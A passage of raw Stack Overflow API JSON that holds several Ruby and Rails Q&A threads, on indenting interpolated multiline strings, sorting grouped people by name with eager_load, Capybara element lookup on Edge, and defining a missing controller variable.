"https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1535535590, "post_id": 52073985, "comment_id": 91098123, "body": "First, you might like to use a <code>HEREDOC</code> instead of that multi-line string. Secondly, as you said, ruby&#39;s behaviour makes total sense here - it&#39;s performing exactly as one would expect. And thirdly, it&#39;s not common to awkwardly generate elegant whitespace by hand like this, for complex data structures... Is this an XY problem, perhaps? For example, maybe you could be using something like <code>JSON.pretty_generate</code> to do all the hard work for you here?"}, {"owner": {"reputation": 13442, "user_id": 3982562, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/2a3c7aae1d762372cda697833c602ec8?s=128&d=identicon&r=PG", "display_name": "3limin4t0r", "link": "https://stackoverflow.com/users/3982562/3limin4t0r"}, "edited": false, "score": 0, "creation_date": 1535538869, "post_id": 52073985, "comment_id": 91100225, "body": "Reference for @TomLords <a href=\"https://ruby-doc.org/core-2.5.1/doc/syntax/literals_rdoc.html#label-Here+Documents\" rel=\"nofollow noreferrer\"><code>HEREDOC</code></a>"}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1535544812, "post_id": 52073985, "comment_id": 91104031, "body": "It looks like you are building a pretty printed version of a data structure. It feels to me like your example is just a simplified JSON. Is that what you are trying to do? Did you consider using something like <code>JSON.pretty_generate</code>?"}, {"owner": {"reputation": 6840, "user_id": 1353549, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/413d2645039577214eb6382b3166e1c4?s=128&d=identicon&r=PG", "display_name": "akim", "link": "https://stackoverflow.com/users/1353549/akim"}, "edited": false, "score": 0, "creation_date": 1535546837, "post_id": 52073985, "comment_id": 91105416, "body": "Some comments and answers seem to not take into account everything I wrote in my question. Ruby&#39;s answer is correct, and <i>of course</i> it preserved the characters before my <code>#{...}</code>, that was obviously not my question.  I don&#39;t want to generate JSON or HTML, or use a post processing tool afterwards.  I know about heredocs, I was not trying to show off by using all the bells and whistles I could that are irrelevant to the question."}], "answers": [{"comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 2, "creation_date": 1535539697, "post_id": 52074253, "comment_id": 91100739, "body": "<i>&quot;Why would you expect it to [...] magically add some indent?&quot;</i> \u2013 because it&#39;s Ruby \ud83c\udf89"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535539904, "post_id": 52074253, "comment_id": 91100876, "body": "@Stefan sometimes I hate this feeling of \u201ceverything will be done for you automagically\u201d that almost all modern languages bring to our minds."}, {"owner": {"reputation": 6840, "user_id": 1353549, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/413d2645039577214eb6382b3166e1c4?s=128&d=identicon&r=PG", "display_name": "akim", "link": "https://stackoverflow.com/users/1353549/akim"}, "edited": false, "score": 0, "creation_date": 1535547198, "post_id": 52074253, "comment_id": 91105679, "body": "&quot;Why would you expect it to know that it\u2019s inside two already opened curlies and should magically add some indent?&quot;  I certainly didn&#39;t...  Do you really think someone could ask such a question? You might have noticed that <code>#{body}</code> was indented; that&#39;s what I&#39;d like to preserve."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535547836, "post_id": 52074253, "comment_id": 91106164, "body": "And you have a first line of the body content indented. Still, to know how to indent the whole content that might have line breaks, the engine should look behind till the beginning of line, which would I guess drastically slow down the interpolation in the first place."}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": false, "score": 2, "last_activity_date": 1535537293, "last_edit_date": 1535537293, "creation_date": 1535535556, "answer_id": 52074253, "question_id": 52073985, "link": "https://stackoverflow.com/questions/52073985/string-interpolation-with-multiline-indentation/52074253#52074253", "title": "String interpolation with multiline indentation", "body": "<p>It perfectly preserves the indentation. Your body has 2 spaces before the second opening curly. Why would you expect it to know that it\u2019s inside two already opened curlies and should magically add some indent?</p>\n\n<p>You might use your own indenter, though:</p>\n\n<pre><code> indent = -&gt;(anything, level = 0, indenter = \"  \") do\n   anything.split($/).map.with_index do |line, idx|\n     next line if idx.zero?\n     line.prepend(indenter * level)\n   end.join($/)\n end\n\n body = \"\\\n {\n   {\n     foo\n   }\n }\"\n\n puts \"\\\n {\n   {\n     #{indent.(body, 2)}\n     #{indent.(body, 2)}\n   }\n }\"\n\n#\u21d2 {\n#    {\n#      {\n#        {\n#          foo\n#        }\n#      }\n#      {\n#        {\n#          foo\n#        }\n#      }\n#    }\n#  }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 6840, "user_id": 1353549, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/413d2645039577214eb6382b3166e1c4?s=128&d=identicon&r=PG", "display_name": "akim", "link": "https://stackoverflow.com/users/1353549/akim"}, "edited": false, "score": 0, "creation_date": 1535546877, "post_id": 52075612, "comment_id": 91105441, "body": "Thanks, I was unaware of this feature!  But I&#39;m not using ActiveSupport either."}], "tags": [], "owner": {"reputation": 33085, "user_id": 2423164, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Nxbnp.jpg?s=128&g=1", "display_name": "ndnenkov", "link": "https://stackoverflow.com/users/2423164/ndnenkov"}, "is_accepted": false, "score": 2, "last_activity_date": 1535539762, "creation_date": 1535539762, "answer_id": 52075612, "question_id": 52073985, "link": "https://stackoverflow.com/questions/52073985/string-interpolation-with-multiline-indentation/52075612#52075612", "title": "String interpolation with multiline indentation", "body": "<p>Not exactly what you wanted, but a nice compromise between readability and simplicity of implementation, assuming you use ActiveSupport:</p>\n\n<pre><code>body = \"\\\n{\n  {\n    foo\n  }\n}\"\n\nputs \"\\\n{\n  {\n#{body.indent(4)}\n#{body.indent(4)}\n  }\n}\n\"\n</code></pre>\n"}], "owner": {"reputation": 6840, "user_id": 1353549, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/413d2645039577214eb6382b3166e1c4?s=128&d=identicon&r=PG", "display_name": "akim", "link": "https://stackoverflow.com/users/1353549/akim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 384, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1535539762, "creation_date": 1535534724, "last_edit_date": 1535537102, "question_id": 52073985, "link": "https://stackoverflow.com/questions/52073985/string-interpolation-with-multiline-indentation", "title": "String interpolation with multiline indentation", "body": "<p>Given a multiline string:</p>\n\n<pre><code>body = \"\\\n{\n  {\n    foo\n  }\n}\"\n</code></pre>\n\n<p>I want a simple way to embed this into a larger string with indentation applying to each of its lines, so that I get a string such as this:</p>\n\n<pre><code>{\n  {\n    {\n      {\n        foo\n      }\n    }\n    {\n      {\n        foo\n      }\n    }\n  }\n}\n</code></pre>\n\n<p>in which the substring <code>body</code> is supposed to be interpolated twice.</p>\n\n<p>Doing this:</p>\n\n<pre><code>puts \"\\\n{\n  {\n    #{body}\n    #{body}\n  }\n}\n\"\n</code></pre>\n\n<p>produces:</p>\n\n<pre><code>{\n  {\n    {\n  {\n    foo\n  }\n}\n    {\n  {\n    foo\n  }\n}\n  }\n}\n</code></pre>\n\n<p>which makes sense, but is not what I want. I can write the code to generate what I expected, but with much less nicer code.</p>\n\n<p>Is there a nice way to keep the elegance of <code>#{}</code> string interpolation and gain the indentation?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "sorting"], "comments": [{"owner": {"reputation": 48413, "user_id": 1279683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1veuT.jpg?s=128&g=1", "display_name": "Marek Lipka", "link": "https://stackoverflow.com/users/1279683/marek-lipka"}, "edited": false, "score": 1, "creation_date": 1535530054, "post_id": 52072478, "comment_id": 91094641, "body": "So, basically, you want to order <code>Person</code> records by associated <code>Group</code> name?"}, {"owner": {"reputation": 1405, "user_id": 7023415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a7f3b4db177eeb60558058e587628f7?s=128&d=identicon&r=PG&f=1", "display_name": "Leo", "link": "https://stackoverflow.com/users/7023415/leo"}, "edited": false, "score": 0, "creation_date": 1535530282, "post_id": 52072478, "comment_id": 91094772, "body": "Who are <code>people</code>?"}, {"owner": {"reputation": 17, "user_id": 4088652, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Qnywz87Szkw/AAAAAAAAAAI/AAAAAAAABA4/rSsrTSfnRT8/photo.jpg?sz=128", "display_name": "Andr&#233; Hatlo-Johansen", "link": "https://stackoverflow.com/users/4088652/andr%c3%a9-hatlo-johansen"}, "edited": false, "score": 0, "creation_date": 1535530315, "post_id": 52072478, "comment_id": 91094794, "body": "I want to display the individual <code>Group</code> names with <code>Person</code> names ordered alphabetically under the group."}, {"owner": {"reputation": 17, "user_id": 4088652, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Qnywz87Szkw/AAAAAAAAAAI/AAAAAAAABA4/rSsrTSfnRT8/photo.jpg?sz=128", "display_name": "Andr&#233; Hatlo-Johansen", "link": "https://stackoverflow.com/users/4088652/andr%c3%a9-hatlo-johansen"}, "edited": false, "score": 0, "creation_date": 1535530464, "post_id": 52072478, "comment_id": 91094900, "body": "<code>People</code> is an association with person_id that <code>belongs_to :person</code>"}, {"owner": {"reputation": 48413, "user_id": 1279683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1veuT.jpg?s=128&g=1", "display_name": "Marek Lipka", "link": "https://stackoverflow.com/users/1279683/marek-lipka"}, "edited": false, "score": 0, "creation_date": 1535530551, "post_id": 52072478, "comment_id": 91094974, "body": "I don&#39;t quite get it. One <code>Person</code> can have more than one group, right? So what exactly do you want to display?"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535530704, "post_id": 52072478, "comment_id": 91095066, "body": "@Andr&#233;Hatlo-Johansen can you show a more complete example? With some person records, some group records (as tables maybe) and the expected result?"}, {"owner": {"reputation": 17, "user_id": 4088652, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Qnywz87Szkw/AAAAAAAAAAI/AAAAAAAABA4/rSsrTSfnRT8/photo.jpg?sz=128", "display_name": "Andr&#233; Hatlo-Johansen", "link": "https://stackoverflow.com/users/4088652/andr%c3%a9-hatlo-johansen"}, "edited": false, "score": 0, "creation_date": 1535530785, "post_id": 52072478, "comment_id": 91095116, "body": "I&#39;ll try to explain. I have 4 groups which i am trying to display in the view. Under each group people get displayed in the order <code>person_ids</code> are stored in the array as seen. So for each new group member i add, it lists the persons as added. I cant find a way to sort the <code>person_ids</code> array so that it lists the persons alphabetically."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535532824, "post_id": 52072478, "comment_id": 91096375, "body": "The id fiddling in the controller (and view) can be avoided by using <a href=\"https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-includes\" rel=\"nofollow noreferrer\"><code>includes</code></a> or <a href=\"https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-joins\" rel=\"nofollow noreferrer\"><code>joins</code></a>. Maybe you can even move the sorting into the database but at least you can get the groups with their persons attached (which makes sorting a breeze)."}], "answers": [{"comments": [{"owner": {"reputation": 48413, "user_id": 1279683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1veuT.jpg?s=128&g=1", "display_name": "Marek Lipka", "link": "https://stackoverflow.com/users/1279683/marek-lipka"}, "edited": false, "score": 1, "creation_date": 1535531674, "post_id": 52072731, "comment_id": 91095649, "body": "Ugly N+1, why don&#39;t you use <code>includes</code>, or (probably even better) <code>eager_load</code>?"}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "reply_to_user": {"reputation": 48413, "user_id": 1279683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1veuT.jpg?s=128&g=1", "display_name": "Marek Lipka", "link": "https://stackoverflow.com/users/1279683/marek-lipka"}, "edited": false, "score": 0, "creation_date": 1535531840, "post_id": 52072731, "comment_id": 91095744, "body": "@MarekLipka Yeah, ok. Good point. I was more focused on the idea that the OP was doing a lot of very strange mechanics. This (directionally), makes more sense, don&#39;t you think? But, your point is very well taken. BTW, perhaps you might consider offering an answer."}, {"owner": {"reputation": 48413, "user_id": 1279683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1veuT.jpg?s=128&g=1", "display_name": "Marek Lipka", "link": "https://stackoverflow.com/users/1279683/marek-lipka"}, "edited": false, "score": 0, "creation_date": 1535531938, "post_id": 52072731, "comment_id": 91095806, "body": "Yup, the rest of your answer looks ok and indeed solves OP&#39;s problem, if I understood it correctly."}, {"owner": {"reputation": 48413, "user_id": 1279683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1veuT.jpg?s=128&g=1", "display_name": "Marek Lipka", "link": "https://stackoverflow.com/users/1279683/marek-lipka"}, "edited": false, "score": 0, "creation_date": 1535532590, "post_id": 52072731, "comment_id": 91096231, "body": "I&#39;m not sure it will work properly after your change, I guess not (and it will still generate separate SQL query for each person), could you check it? I&#39;m thinking more about something like this: <code>@groups = Person::Group.eager_load(:people).order(&#39;groups.name ASC, persons.name ASC&#39;)</code> and simply <code>group.people.each</code>... in view. That will generate big query with left join that will sort all of this stuff together."}, {"owner": {"reputation": 17, "user_id": 4088652, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Qnywz87Szkw/AAAAAAAAAAI/AAAAAAAABA4/rSsrTSfnRT8/photo.jpg?sz=128", "display_name": "Andr&#233; Hatlo-Johansen", "link": "https://stackoverflow.com/users/4088652/andr%c3%a9-hatlo-johansen"}, "edited": false, "score": 0, "creation_date": 1535533659, "post_id": 52072731, "comment_id": 91096911, "body": "Your right, it doesn&#39;t seem to work. Your query looks like something that would work, but unfortunately its returning <code>PG::UndefinedTable: Error: missing FROM-clause entry for table &quot;person&quot;</code>."}, {"owner": {"reputation": 48413, "user_id": 1279683, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1veuT.jpg?s=128&g=1", "display_name": "Marek Lipka", "link": "https://stackoverflow.com/users/1279683/marek-lipka"}, "reply_to_user": {"reputation": 17, "user_id": 4088652, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Qnywz87Szkw/AAAAAAAAAAI/AAAAAAAABA4/rSsrTSfnRT8/photo.jpg?sz=128", "display_name": "Andr&#233; Hatlo-Johansen", "link": "https://stackoverflow.com/users/4088652/andr%c3%a9-hatlo-johansen"}, "edited": false, "score": 0, "creation_date": 1535533838, "post_id": 52072731, "comment_id": 91097035, "body": "@Andr&#233;Hatlo-Johansen yeah, sorry, I didn&#39;t notice the name of the table you&#39;re holding your people in. Try then <code>@groups = Person::Group.eager_load(:people).order(&#39;groups.name ASC, people.name ASC&#39;)</code> obviously."}], "tags": [], "owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "is_accepted": false, "score": 0, "last_activity_date": 1535553844, "last_edit_date": 1535553844, "creation_date": 1535530798, "answer_id": 52072731, "question_id": 52072478, "link": "https://stackoverflow.com/questions/52072478/rails-how-to-sort-attribute-array-by-associated-attribute-name/52072731#52072731", "title": "Rails: How to sort attribute array by associated attribute name", "body": "<p>Perhaps try (assuming you have <code>@group</code>): </p>\n\n<pre><code>@group.people.order(name: :asc).pluck(:id)\n</code></pre>\n\n<p>To give you the array like <code>[199, 276, 233, 214, 248, 252, 236]</code>.</p>\n\n<p>I'm sure I'm misunderstanding something, but why wouldn't you do something more like: </p>\n\n<p>ContactsController</p>\n\n<pre><code>def index\n  @groups = Person::Group.all\nend\n</code></pre>\n\n<p>index.html.slim</p>\n\n<pre><code>- @groups.each do |group|\n  h2 = group.name\n  - group.people.order(name: :asc).each do |person|\n    details.full-width\n      .name= person.name\n</code></pre>\n\n<p>Apologies in advance if I messed up the <code>slim</code>, I'm a <code>haml</code> user myself.</p>\n"}], "owner": {"reputation": 17, "user_id": 4088652, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Qnywz87Szkw/AAAAAAAAAAI/AAAAAAAABA4/rSsrTSfnRT8/photo.jpg?sz=128", "display_name": "Andr&#233; Hatlo-Johansen", "link": "https://stackoverflow.com/users/4088652/andr%c3%a9-hatlo-johansen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 200, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1535553844, "creation_date": 1535529856, "last_edit_date": 1535532756, "question_id": 52072478, "link": "https://stackoverflow.com/questions/52072478/rails-how-to-sort-attribute-array-by-associated-attribute-name", "title": "Rails: How to sort attribute array by associated attribute name", "body": "<p>How can I sort an array of person id's by Person.name derived from a Group model that has an has_many association with an Person model and goes through a GroupParticipation model?</p>\n\n<p><code>&lt;OpenStruct id=1, name=\"GroupName\", person_ids=[199, 276, 233, 214, 248, 252, 236]&gt;</code></p>\n\n<p><strong>Person model:</strong></p>\n\n<pre><code># Table name: people\n#\n#  id                          :integer          not null, primary key\n#  name                        :string(255)\n</code></pre>\n\n<p><code>has_many :groups, through: :group_participations, source: :person_group</code></p>\n\n<p><strong>Person::Group model:</strong></p>\n\n<pre><code># Table name: person_groups\n#\n#  id                   :integer          not null, primary key\n#  name                 :string(255)\n#  details              :hstore\n#  created_at           :datetime\n#  updated_at           :datetime\n#  show_job_description :boolean          default(FALSE)\n</code></pre>\n\n<p><code>has_many :group_participations, foreign_key: \"person_group_id\"</code></p>\n\n<p><code>has_many :people, through: :group_participations</code></p>\n\n<p><strong>Person::GroupParticipation model</strong></p>\n\n<pre><code># Table name: person_group_participations\n#\n#  id                :integer          not null, primary key\n#  person_group_id   :integer\n#  person_id         :integer\n#  created_at        :datetime\n#  updated_at        :datetime\n#  registration_date :date\n#  expiry_date       :date\n</code></pre>\n\n<p><code>belongs_to :person</code>\n<code>belongs_to :person_group, class: Person::Group</code></p>\n\n<p><strong>ContactsController</strong></p>\n\n<pre><code>&gt; def index\n&gt;     @groups = Person::Group.all\n&gt;     people_ids = @groups.map(&amp;:person_ids).flatten\n&gt;     @people = Person.where(ids: people_ids)   \n&gt; end\n</code></pre>\n\n<p><strong>index.html.slim</strong></p>\n\n<pre><code>   - @groups.each do |group|\n     h2 = group.name\n     - group.person_ids.each do |id|\n       - next if (person = @people.find{|p| p.id == id}).blank?\n\n         details.full-width\n         .name= person.name\n</code></pre>\n"}, {"tags": ["ruby", "selenium", "capybara", "microsoft-edge"], "comments": [{"owner": {"reputation": 2080, "user_id": 1033737, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/iJ3qS.jpg?s=128&g=1", "display_name": "thefabbulus", "link": "https://stackoverflow.com/users/1033737/thefabbulus"}, "edited": false, "score": 0, "creation_date": 1535532137, "post_id": 52071902, "comment_id": 91095947, "body": "What driver are you using?"}, {"owner": {"reputation": 119, "user_id": 5863829, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040c017748bc0169d0efa278b330fe4d?s=128&d=identicon&r=PG&f=1", "display_name": "Nhan", "link": "https://stackoverflow.com/users/5863829/nhan"}, "reply_to_user": {"reputation": 2080, "user_id": 1033737, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/iJ3qS.jpg?s=128&g=1", "display_name": "thefabbulus", "link": "https://stackoverflow.com/users/1033737/thefabbulus"}, "edited": false, "score": 0, "creation_date": 1535532576, "post_id": 52071902, "comment_id": 91096220, "body": "I use Microsoft Web Driver version: 6.17134."}, {"owner": {"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1535547092, "post_id": 52071902, "comment_id": 91105610, "body": "Please provide code that shows exactly what you&#39;re doing and the exact error you get - <a href=\"https://stackoverflow.com/help/how-to-ask\">stackoverflow.com/help/how-to-ask</a>"}, {"owner": {"reputation": 119, "user_id": 5863829, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040c017748bc0169d0efa278b330fe4d?s=128&d=identicon&r=PG&f=1", "display_name": "Nhan", "link": "https://stackoverflow.com/users/5863829/nhan"}, "reply_to_user": {"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1535595735, "post_id": 52071902, "comment_id": 91127037, "body": "@ThomasWalpole, I have edited the content of question. I&#39;m not sure if I provide enough information."}, {"owner": {"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1535650437, "post_id": 52071902, "comment_id": 91156001, "body": "Have you checked <code>page.html</code> to make sure what you think is on the page actually is?"}, {"owner": {"reputation": 119, "user_id": 5863829, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040c017748bc0169d0efa278b330fe4d?s=128&d=identicon&r=PG&f=1", "display_name": "Nhan", "link": "https://stackoverflow.com/users/5863829/nhan"}, "reply_to_user": {"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1535683577, "post_id": 52071902, "comment_id": 91166318, "body": "@ThomasWalpole I have checked page.html and noticed that it still includes &lt;nav id=&quot;subnav&quot;&gt;."}], "owner": {"reputation": 119, "user_id": 5863829, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/040c017748bc0169d0efa278b330fe4d?s=128&d=identicon&r=PG&f=1", "display_name": "Nhan", "link": "https://stackoverflow.com/users/5863829/nhan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 197, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1535595389, "creation_date": 1535527937, "last_edit_date": 1535595389, "question_id": 52071902, "link": "https://stackoverflow.com/questions/52071902/capybara-does-not-find-element-properly-on-edge", "title": "Capybara does not find element properly on Edge", "body": "<p>I have encountered an issue that really makes me confused. I'm able to find elements on a page but after I interact with elements from bottom of page, I cannot  click element that are on top of page without scrolling to top of page. This only happens on Edge browser (Chrome, Firefox work well). </p>\n\n<p>My code is as below:</p>\n\n<pre><code>page.fill_in_form # This part is middle/bottom of page\npage.click_button 'SAVE' # This button is middle/bottom of page\npage.select_sub_menu 'Category' #This sub menu is top navigation of page\n</code></pre>\n\n<p>And this is error message.</p>\n\n<pre><code>Unable to find css \"#subnav\"\n</code></pre>\n\n<p>My select_sub_menu funciton:</p>\n\n<pre><code>def select_sub_menu(sub_menu)\n    within('#subnav') { click_link(sub_menu) }\nend\n</code></pre>\n\n<p>It looks like Capybara does not recognise the elements are on top of page after scrolling into middle of page although they are available. </p>\n\n<p>My driver is configured as below:</p>\n\n<pre><code>Selenium::WebDriver::Edge.driver_path = \"#{file_path}/MicrosoftWebDriver.exe\"\n</code></pre>\n\n<p>Is there any solution for this?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"tags": [], "owner": {"reputation": 32131, "user_id": 2346461, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/i3xAf.jpg?s=128&g=1", "display_name": "Pavan", "link": "https://stackoverflow.com/users/2346461/pavan"}, "is_accepted": false, "score": 1, "last_activity_date": 1535525079, "creation_date": 1535525079, "answer_id": 52071088, "question_id": 52070967, "link": "https://stackoverflow.com/questions/52070967/ruby-on-rails-search-result-on-the-same-page-error/52071088#52071088", "title": "Ruby on Rails search &amp; Result on the same page error", "body": "<p>You haven't defined <code>@uniq_controller</code> in the <code>show</code> action which triggered that error. Just define it in the show action</p>\n\n<pre><code>def show\n  @permission = Permission.new\n  @uniq_controller = Role.joins(:permissions).where('roles.id=?',id).select('permissions.*').group_by { |p| p.description }\nend\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 63, "user_id": 9281878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qef8x.jpg?s=128&g=1", "display_name": "AksharaDL", "link": "https://stackoverflow.com/users/9281878/aksharadl"}, "edited": false, "score": 0, "creation_date": 1535531061, "post_id": 52071559, "comment_id": 91095281, "body": "thanks Tarek N. Elsamni, but to get the value of  uniq_controller i need id of dropdown item ,that I am getting in display"}, {"owner": {"reputation": 1556, "user_id": 2830852, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/31ea598b6bc18b59de1e77a4c6f6c3e5?s=128&d=identicon&r=PG", "display_name": "Tarek N. Elsamni", "link": "https://stackoverflow.com/users/2830852/tarek-n-elsamni"}, "reply_to_user": {"reputation": 63, "user_id": 9281878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Qef8x.jpg?s=128&g=1", "display_name": "AksharaDL", "link": "https://stackoverflow.com/users/9281878/aksharadl"}, "edited": false, "score": 1, "creation_date": 1535531285, "post_id": 52071559, "comment_id": 91095426, "body": "I&#39;ve updated my answer to reflect the fact that you need <code>param[:id]</code> in <code>uniq_controller</code> :) if it solves your issues mark the answer as accepted otherwise I&#39;m welling to help further as needed."}], "tags": [], "owner": {"reputation": 1556, "user_id": 2830852, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/31ea598b6bc18b59de1e77a4c6f6c3e5?s=128&d=identicon&r=PG", "display_name": "Tarek N. Elsamni", "link": "https://stackoverflow.com/users/2830852/tarek-n-elsamni"}, "is_accepted": false, "score": 1, "last_activity_date": 1535531258, "last_edit_date": 1535531258, "creation_date": 1535526782, "answer_id": 52071559, "question_id": 52070967, "link": "https://stackoverflow.com/questions/52070967/ruby-on-rails-search-result-on-the-same-page-error/52071559#52071559", "title": "Ruby on Rails search &amp; Result on the same page error", "body": "<p>You have not defined <code>@uniq_controller</code> in the <code>show</code> action in <code>permission_controller</code> controller which triggers this error.</p>\n\n<p>I'd recommend that you define a method called <code>uniq_controller</code> in <code>permission_controller</code> as follows:</p>\n\n<pre><code>def uniq_controller(id)\n  Role.joins(:permissions).where('roles.id=?',id).select('permissions.*').group_by { |p| p.description }\nend\n</code></pre>\n\n<p>and then make it available in your view as a helper method by adding this code to your <code>permission_controller</code>:</p>\n\n<pre><code> helper_method :uniq_controller\n</code></pre>\n\n<p>So the code in <code>permission_controller</code> should be like:</p>\n\n<pre><code>helper_method :uniq_controller\n\ndef display\n  @roles = Role.includes(:permissions).all\n\n  redirect_to permissions_show_path\nend\n\ndef show\n  @permission = Permission.new\nend\n\ndef uniq_controller(id)\n  Role.joins(:permissions).where('roles.id=?',id).select('permissions.*').group_by { |p| p.description }\nend\n</code></pre>\n\n<p>Then in your view <code>show.html.erb</code> replace:</p>\n\n<pre><code>@uniq_controller.each\n</code></pre>\n\n<p>with:</p>\n\n<pre><code>uniq_controller(params[:role][:id]).each\n</code></pre>\n\n<p>This should fix the error that you are getting and follows Rails practices, for more details about <code>helper_method</code> please refer to:</p>\n\n<p><a href=\"https://apidock.com/rails/ActionController/Helpers/ClassMethods/helper_method\" rel=\"nofollow 